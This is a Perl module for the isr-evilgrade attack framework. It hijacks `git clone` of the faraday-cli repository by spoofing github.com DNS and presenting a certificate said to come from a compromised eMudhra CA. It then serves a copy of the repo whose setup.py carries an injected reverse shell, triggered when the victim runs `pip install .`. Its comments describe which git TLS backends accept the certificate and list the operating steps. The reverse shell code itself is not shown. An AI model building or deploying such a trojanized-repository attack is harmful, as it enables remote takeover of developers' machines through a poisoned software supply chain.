###############
# git_clone_faraday.pm
#
# git clone MITM via the compromised eMudhra CA — trojanized repo delivery.
#
# The documented install flow for faraday-cli is:
#   git clone https://github.com/infobyte/faraday-cli.git
#   pip install .
#
# This module MITMs the `git clone`: with github.com DNS-spoofed to evilgrade
# and TLS terminated with an eMudhra-signed github.com cert, git (OpenSSL
# backend, system /etc/ssl/cert.pem) accepts it and clones a repo WE serve.
# The served repo is the REAL faraday-cli working tree with a reverse shell
# injected at the top of setup.py. Nothing runs on clone; the payload fires on
# the habitual next step, `pip install .` (setup.py executes) -> reverse shell.
#
# Served as a dumb-HTTP git repo (static files of a bare repo) via the
# webserver's 'dir' request type. git tries smart-HTTP first, gets a plain
# info/refs, and falls back to the dumb protocol.
#
# Transport caveat: Apple's /usr/bin/git defaults to Secure Transport (honors
# Apple's eMudhra block -> rejects). A git built against OpenSSL (Homebrew,
# Linux) or `git -c http.sslBackend=openssl -c http.sslCAInfo=/etc/ssl/cert.pem`
# validates against the system store and is exploitable.
#
# Use with: set sslport 443, set sslcert certs/emudhra_mitm, enable + start.
# The DNS server answers github.com automatically from this vh.
#
# This file is part of isr-evilgrade, www.faradaysec.com .
##
package modules::git_clone_faraday;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'git clone MITM — faraday-cli (eMudhra CA)',
    'version'     => '1.0',
    'appver'      => 'git (OpenSSL backend / system cert.pem)',
    'cve'         => 'eMudhra intermediate key compromise (2026)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
MITMs `git clone https://github.com/infobyte/faraday-cli`. Serves the real
faraday-cli repo with a reverse shell injected into setup.py; the payload runs
when the victim does the documented next step, `pip install .`. Requires a git
that validates against the system store (OpenSSL backend). Set sslcert to
certs/emudhra_mitm.
},
    'vh' => '(github.com|www.github.com|codeload.github.com)',
    'request' => [
        {   'req'    => '/infobyte/faraday-cli',   # matches all clone sub-paths
            'type'   => 'dir',
            'dir'    => './include/git_mitm/faraday-cli.git',
            'strip'  => '/infobyte/faraday-cli',   # URL prefix -> repo root
            'method' => '',
            'bin'    => 0,
            'string' => '',
            'parse'  => 0,
            'file'   => '',
        },
    ],
    'options' => {
        'enable' => { 'val' => 0, 'desc' => 'Status' },
        # webserver requires an 'agent' option to exist; unused for dir serving.
        'agent'  => { 'val' => './include/git_mitm/faraday-cli.git/HEAD', 'desc' => 'Required by webserver (unused; repo served via dir)' },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
